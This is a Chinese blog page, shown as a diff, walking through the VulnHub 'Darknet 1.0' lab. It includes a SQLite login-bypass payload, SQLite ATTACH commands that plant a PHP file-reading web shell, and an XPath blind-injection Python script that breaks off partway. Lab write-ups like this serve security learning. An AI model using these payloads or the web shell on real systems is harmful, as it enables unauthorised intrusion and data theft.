@@ -1,0 +1,712 @@
+  <!DOCTYPE html>
+  <html lang="zh-CN"  
+      data-theme-mode="auto"
+  >
+  <head>
+  <meta charset="utf-8">
+  
+  
+  
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_a0oqhord1y';window.REIMU_CONFIG.clipboard_tips = {"success":{"zh-CN":"复制成功 (*^▽^*)"},"fail":{"zh-CN":"复制失败 (ﾟ⊿ﾟ)ﾂ"},"copyright":{"enable":false,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = '本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'http://example.com';</script>
+  <title>
+    VulnHub Darknet：1.0 | 雾島风起時
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media='all'">
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_a0oqhord1y.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+    <meta name="description" content="Darknet: 1.0项目地址：https:&#x2F;&#x2F;download.vulnhub.com&#x2F;darknet&#x2F;Darknet.rar 是一个打包好的镜像文件 注意：导入 vmx 时一定要选择我已移动，否则没网 使用 Nmap 扫描出开放服务及操作系统版本  敏感信息泄露Apache 虚拟主机配置文件扫描目录发现一个文件  文件内容如下 123456&lt;VirtualHost *:80&gt;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="VulnHub Darknet：1.0">
+<meta property="og:url" content="http://example.com/2026/04/01/Darknet%201.0/index.html">
+<meta property="og:site_name" content="雾島风起時">
+<meta property="og:description" content="Darknet: 1.0项目地址：https:&#x2F;&#x2F;download.vulnhub.com&#x2F;darknet&#x2F;Darknet.rar 是一个打包好的镜像文件 注意：导入 vmx 时一定要选择我已移动，否则没网 使用 Nmap 扫描出开放服务及操作系统版本  敏感信息泄露Apache 虚拟主机配置文件扫描目录发现一个文件  文件内容如下 123456&lt;VirtualHost *:80&gt;">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69b10afdad79459fdc9e297c.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69b10bb3ad79459fdc9e298c.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69b10da0ad79459fdc9e29a9.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69b1104dad79459fdc9e29de.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69b11823ad79459fdc9e5151.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69b11b09ad79459fdc9e51fe.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69b11f13ad79459fdc9e5282.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69b11fe1ad79459fdc9e530d.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69b1222dad79459fdc9e8159.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69b1232aad79459fdc9e8670.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69b123e7ad79459fdc9e8a0c.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69b12853ad79459fdc9e9b5c.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69b129e3ad79459fdc9e9ce1.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69b12a69ad79459fdc9e9f5f.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69b12b24ad79459fdc9e9f6d.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69b122a4ad79459fdc9e836b.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69b122dbad79459fdc9e8461.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69b12b73ad79459fdc9e9f6f.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69b12bbaad79459fdc9e9f74.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69b12c06ad79459fdc9e9f7b.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69b13b0ead79459fdc9ee47a.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69b13c4fad79459fdc9eeca3.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69b13c9fad79459fdc9eee08.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69b13f73ad79459fdc9f1d0e.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69b14068ad79459fdc9f1d10.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69b14223ad79459fdc9f1d1c.png">
+<meta property="article:published_time" content="2026-04-01T08:22:00.000Z">
+<meta property="article:modified_time" content="2026-04-01T09:07:15.286Z">
+<meta property="article:author" content="ALL">
+<meta property="article:tag" content="RCE">
+<meta property="article:tag" content="SQL 注入">
+<meta property="article:tag" content="XPath 注入">
+<meta property="article:tag" content="弱口令">
+<meta property="article:tag" content="提权">
+<meta property="article:tag" content="敏感信息泄露">
+<meta property="article:tag" content="文件上传">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic1.imgdb.cn/item/69b10afdad79459fdc9e297c.png">
+    <link rel="alternate" href="/atom.xml" title="雾島风起時" type="application/atom+xml">
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" integrity="sha384-IfxC36XL/toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei+Zx/1oA/0l8ysE" crossorigin="anonymous">
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css" integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous">
+
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+  <body>
+      <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate">
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  <script>
+    var time = null;
+    var loaderEl = document.getElementById('loader');
+    var startLoading = () => {
+      time = Date.now();
+      loaderEl.classList.remove("loading");
+    }
+    var hideLoader = () => {
+      document.body.style.overflow = 'auto';
+      loader.classList.add('loading');
+    };
+
+    var endLoading = () => {
+      if (!time) {
+        hideLoader();
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          hideLoader();
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    loaderEl.addEventListener('click', endLoading);
+  </script>
+<div id="copy-tooltip"></div>
+<div id="heatmap-tooltip"></div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav" aria-label="Primary navigation">
+        <a class="main-nav-link-wrap" href="/">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">首页</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/archives">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">归档</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/about">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">关于</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/friend">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">友链</span>
+        </a>
+    <a id="main-nav-toggle" class="nav-icon" aria-label="Toggle navigation" role="button"></a>
+  </nav>
+  <nav id="sub-nav" aria-label="Secondary navigation">
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" aria-label="RSS 订阅" target="_blank"></a>
+  </nav>
+</div>
+<header id="header" aria-label="Site header">
+        <picture>
+        </picture>
+          <img  fetchpriority="high" src="/images/banner.webp" alt="VulnHub Darknet：1.0">
+  <div id="header-outer">
+    <div id="header-title">
+          <span id="logo">
+            <h1 data-aos="slide-up">VulnHub Darknet：1.0</h1>
+          </span>
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+        </h2>
+    </div>
+  </div>
+</header>
+
+        <div id="content" aria-label="Page content"  class="sidebar-right" >
+          <aside id="sidebar" aria-label="Sidebar">
+  <div class="sidebar-wrapper-container sticky">
+  <div class="sidebar-wrapper">
+    <div class="sidebar-wrap" data-aos="fade-up">
+          <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Darknet-1-0"><span class="toc-number">1.</span> <span class="toc-text">Darknet: 1.0</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-number">1.1.</span> <span class="toc-text">敏感信息泄露</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Apache-%E8%99%9A%E6%8B%9F%E4%B8%BB%E6%9C%BA%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="toc-number">1.1.1.</span> <span class="toc-text">Apache 虚拟主机配置文件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL-%E6%B3%A8%E5%85%A5"><span class="toc-number">1.2.</span> <span class="toc-text">SQL 注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Darknet%EF%BC%88%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81%EF%BC%89"><span class="toc-number">1.2.1.</span> <span class="toc-text">Darknet（万能密码）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RCE"><span class="toc-number">1.3.</span> <span class="toc-text">RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SQLite"><span class="toc-number">1.3.1.</span> <span class="toc-text">SQLite</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Xpath-%E6%B3%A8%E5%85%A5"><span class="toc-number">1.4.</span> <span class="toc-text">Xpath 注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Contacto"><span class="toc-number">1.4.1.</span> <span class="toc-text">Contacto</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E7%82%B9%E6%8E%A2%E6%B5%8B"><span class="toc-number">1.4.1.1.</span> <span class="toc-text">注入点探测</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%88%86%E7%A0%B4%E8%8A%82%E7%82%B9"><span class="toc-number">1.4.1.2.</span> <span class="toc-text">爆破节点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%88%86%E7%A0%B4%E5%AD%97%E6%AE%B5%E5%B1%9E%E6%80%A7"><span class="toc-number">1.4.1.3.</span> <span class="toc-text">爆破字段属性</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%88%86%E7%A0%B4%E5%AD%97%E6%AE%B5%E5%80%BC"><span class="toc-number">1.4.1.4.</span> <span class="toc-text">爆破字段值</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%B1%E5%8F%A3%E4%BB%A4"><span class="toc-number">1.5.</span> <span class="toc-text">弱口令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Secure-Login"><span class="toc-number">1.5.1.</span> <span class="toc-text">Secure Login</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">1.6.</span> <span class="toc-text">文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#htaccess"><span class="toc-number">1.6.1.</span> <span class="toc-text">.htaccess</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">1.7.</span> <span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#etc-suphp-conf-%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93"><span class="toc-number">1.7.1.</span> <span class="toc-text">&#x2F;etc&#x2F;suphp.conf 配置不当</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.7.2.</span> <span class="toc-text">反序列化</span></a></li></ol></li></ol></li></ol>
+</div>
+</div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="ALL" class="lazyload">
+  <div class="sidebar-author-name">ALL</div>
+  <div class="sidebar-description">雾島风起時の日常</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">39</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">1</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">22</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/duckpigdog itemprop="url" target="_blank" aria-label="github" rel="noopener nofollow noreferrer"></a>
+    </div>
+    <div class="icon-bilibili sidebar-social-icon">
+      <a href=https://space.bilibili.com/1337537884?spm_id_from=333.1007.0.0 itemprop="url" target="_blank" aria-label="bilibili" rel="noopener nofollow noreferrer"></a>
+    </div>
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+</div>
+</div>
+          <div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div>
+    </div>
+  </div>
+  <div class="sidebar-widget">
+  </div>
+  </div>
+</aside>
+
+          <section id="main" aria-label="Main content"><article id="post-Darknet 1.0" class="h-entry article" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <span class="article-date-link icon-calendar" data-aos="zoom-in">
+    <time datetime="2026-04-01T08:22:00.000Z" itemprop="datePublished">2026-04-01</time>
+    <time style="display: none;" id="post-update-time">2026-04-01</time>
+  </span>
+</div>
+
+    </div>
+    
+    <div class="hr-line"></div>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+        <h1 id="Darknet-1-0"><a href="#Darknet-1-0" class="headerlink" title="Darknet: 1.0"></a>Darknet: 1.0</h1><p>项目地址：<a target="_blank" rel="noopener" href="https://download.vulnhub.com/darknet/Darknet.rar">https://download.vulnhub.com/darknet/Darknet.rar</a></p>
+<p>是一个打包好的镜像文件</p>
+<p><strong>注意：导入 vmx 时一定要选择我已移动，否则没网</strong></p>
+<p>使用 Nmap 扫描出开放服务及操作系统版本</p>
+<p><img src="https://pic1.imgdb.cn/item/69b10afdad79459fdc9e297c.png"></p>
+<h2 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h2><h3 id="Apache-虚拟主机配置文件"><a href="#Apache-虚拟主机配置文件" class="headerlink" title="Apache 虚拟主机配置文件"></a>Apache 虚拟主机配置文件</h3><p>扫描目录发现一个文件</p>
+<p><img src="https://pic1.imgdb.cn/item/69b10bb3ad79459fdc9e298c.png"></p>
+<p>文件内容如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line">    ServerName 888.darknet.com</span><br><span class="line">    ServerAdmin devnull@darknet.com</span><br><span class="line">    DocumentRoot /home/devnull/public_html</span><br><span class="line">    ErrorLog /home/devnull/logs</span><br><span class="line">&lt;/VirtualHost&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这是一个 Apache 虚拟主机配置文件</p>
+<ul>
+<li><strong>域名</strong>：<code>888.darknet.com</code></li>
+<li><strong>管理员邮箱</strong>：<code>devnull@darknet.com</code></li>
+<li><strong>网站根目录</strong>：<code>/home/devnull/public_html</code></li>
+<li><strong>错误日志路径</strong>：<code>/home/devnull/logs</code></li>
+<li><strong>用户名</strong>：<code>devnull</code></li>
+</ul>
+<p><code>.htaccess</code> 是 Apache 服务器中用于<strong>目录级别配置</strong>的文件，通常用来控制访问权限、重写 URL 等</p>
+<p>尝试修改 hosts 文件将 <code>888.darknet.com</code> 指向目标 IP</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/hosts</span><br></pre></td></tr></table></figure>
+
+<p>添加内容为</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.1.100   888.darknet.com</span><br></pre></td></tr></table></figure>
+
+<p>之后访问该域名即可看到登录框</p>
+<p><img src="https://pic1.imgdb.cn/item/69b10da0ad79459fdc9e29a9.png"></p>
+<h2 id="SQL-注入"><a href="#SQL-注入" class="headerlink" title="SQL 注入"></a>SQL 注入</h2><h3 id="Darknet（万能密码）"><a href="#Darknet（万能密码）" class="headerlink" title="Darknet（万能密码）"></a>Darknet（万能密码）</h3><p>使用 SQLMap 没有跑出来，尝试手动注入</p>
+<p><code>unrecognized token</code> 是 <strong>SQLite</strong> 数据库非常典型的错误描述</p>
+<p><img src="https://pic1.imgdb.cn/item/69b1104dad79459fdc9e29de.png"></p>
+<p>尝试万能密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">devnull<span class="string">&#x27; or &#x27;</span>1</span><br></pre></td></tr></table></figure>
+
+<p>构造的语句</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> <span class="keyword">user</span><span class="operator">=</span><span class="string">&#x27;devnull&#x27;</span> <span class="keyword">or</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> pass<span class="operator">=</span><span class="string">&#x27;[MD5_HASH]&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>万能密码登录成功</p>
+<p><img src="https://pic1.imgdb.cn/item/69b11823ad79459fdc9e5151.png"></p>
+<h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><h3 id="SQLite"><a href="#SQLite" class="headerlink" title="SQLite"></a>SQLite</h3><p>这里需要了解 SQLite 注入怎么 RCE，首先得知道路径</p>
+<p><img src="https://pic1.imgdb.cn/item/69b11b09ad79459fdc9e51fe.png"></p>
+<p>再结合上面的信息泄露可得出</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/home/devnull/public_html/img/</span><br><span class="line">/home/devnull/public_html/css/</span><br><span class="line">/home/devnull/public_html/includes/</span><br></pre></td></tr></table></figure>
+
+<p>首先，通过注入点执行 <code>ATTACH</code> 命令</p>
+<p>这会在服务器磁盘上创建一个名为 <code>shell.php</code> 的新数据库文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ATTACH DATABASE &#x27;/home/devnull/public_html/img/phpinfo.php&#x27; as pwn;</span><br></pre></td></tr></table></figure>
+
+<p>在刚刚附加的 <code>pwn</code> 库中创建一个字段，用于承载我们的木马代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE pwn.shell (code TEXT);</span><br></pre></td></tr></table></figure>
+
+<p>将 PHP 代码插入到表中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO pwn.shell (code) VALUES (&#x27;&lt;?php phpinfo(); ?&gt;&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>发现禁用了大多数命令执行函数</p>
+<p><img src="https://pic1.imgdb.cn/item/69b11f13ad79459fdc9e5282.png"></p>
+<p>尝试绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ATTACH DATABASE &#x27;/home/devnull/public_html/img/files.php&#x27; as pwn;</span><br><span class="line">CREATE TABLE pwn.shell (code TEXT);</span><br><span class="line">    INSERT INTO pwn.shell (code) VALUES (&quot;&lt;?php if($_GET[&#x27;a&#x27;] == &#x27;ls&#x27;) &#123; print_r(scandir($_GET[&#x27;p&#x27;])); &#125; if($_GET[&#x27;a&#x27;] == &#x27;cat&#x27;) &#123; print_r(readfile($_GET[&#x27;p&#x27;])); &#125; ?&gt;&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>找到了另一个 VirtualHost 配置文件<code>/etc/apache2/sites-available/</code></p>
+<p><img src="https://pic1.imgdb.cn/item/69b11fe1ad79459fdc9e530d.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line">    ServerName signal8.darknet.com</span><br><span class="line">    ServerAdmin errorlevel@darknet.com</span><br><span class="line">    DocumentRoot /home/errorlevel/public_html</span><br><span class="line"></span><br><span class="line">    &lt;Directory /home/errorlevel/public_html&gt;</span><br><span class="line">        Options -Indexes +FollowSymLinks</span><br><span class="line">        AllowOverride All</span><br><span class="line">        Require all granted</span><br><span class="line">    &lt;/Directory&gt;</span><br><span class="line"></span><br><span class="line">    ErrorLog /var/log/apache2/signal8_error.log</span><br><span class="line">    CustomLog /var/log/apache2/signal8_access.log combined</span><br><span class="line">&lt;/VirtualHost&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Xpath-注入"><a href="#Xpath-注入" class="headerlink" title="Xpath 注入"></a>Xpath 注入</h2><h3 id="Contacto"><a href="#Contacto" class="headerlink" title="Contacto"></a>Contacto</h3><p>重新修改 <code>/etc/hosts</code> 访问</p>
+<p><img src="https://pic1.imgdb.cn/item/69b1222dad79459fdc9e8159.png"></p>
+<p>点击图片中的链接跳转到了新的页面，同时 URL 中多了一个参数 id</p>
+<p><img src="https://pic1.imgdb.cn/item/69b1232aad79459fdc9e8670.png"></p>
+<p>但是测试 SQL 注入并不存在，于是开始 FUZZ</p>
+<p>发现该有效载荷 <code>count(/child::node())</code> 成功地为该参数返回了有效结果<code>id</code></p>
+<p><img src="https://pic1.imgdb.cn/item/69b123e7ad79459fdc9e8a0c.png"></p>
+<p><code>count(/child::node())</code> 是标准的 XPath 1.0 语法，用于计算当前 XML 文档根节点下子节点的数量</p>
+<h4 id="注入点探测"><a href="#注入点探测" class="headerlink" title="注入点探测"></a>注入点探测</h4><p>构造真命题  <code>id=1 and 1=1 </code> 确认能否布尔盲注</p>
+<p><img src="https://pic1.imgdb.cn/item/69b12853ad79459fdc9e9b5c.png"></p>
+<h4 id="爆破节点"><a href="#爆破节点" class="headerlink" title="爆破节点"></a>爆破节点</h4><p>我们不知道 XML 的结构，所以必须利用 <code>name()</code> 和位置函数来让服务器“自报家门”</p>
+<p>我们通过 <code>starts-with(name(.), &#39;a&#39;)</code>、<code>starts-with(name(.), &#39;ab&#39;)</code> 不断累加字符</p>
+<p>只要页面返回了 <code>errorlevel@darknet.com</code>，就说明我们的猜解是正确的</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置实战参数</span></span><br><span class="line">ENTRY_POINT = <span class="string">&#x27;http://signal8.darknet.com/contact.php&#x27;</span></span><br><span class="line"><span class="comment"># 成功的标志：页面出现了该邮箱</span></span><br><span class="line">SUCCESS_FLAG = <span class="string">&#x27;errorlevel@darknet.com&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_out</span>(<span class="params">char</span>):</span><br><span class="line">    sys.stdout.write(char)</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exfiltrate_node_name</span>(<span class="params">payload_template</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    通用猜解函数</span></span><br><span class="line"><span class="string">    payload_template: 例如 &quot;1 and starts-with(name(.),&#x27;&#123;exfil&#125;&#x27;)&quot;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    exfil = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        found_char = <span class="literal">False</span></span><br><span class="line">        <span class="comment"># 遍历可打印字符（重点关注字母和数字）</span></span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> string.ascii_letters + string.digits:</span><br><span class="line">            test_payload = payload_template.<span class="built_in">format</span>(exfil=exfil + char)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                r = requests.get(ENTRY_POINT, params=&#123;<span class="string">&#x27;id&#x27;</span>: test_payload&#125;, timeout=<span class="number">5</span>)</span><br><span class="line">                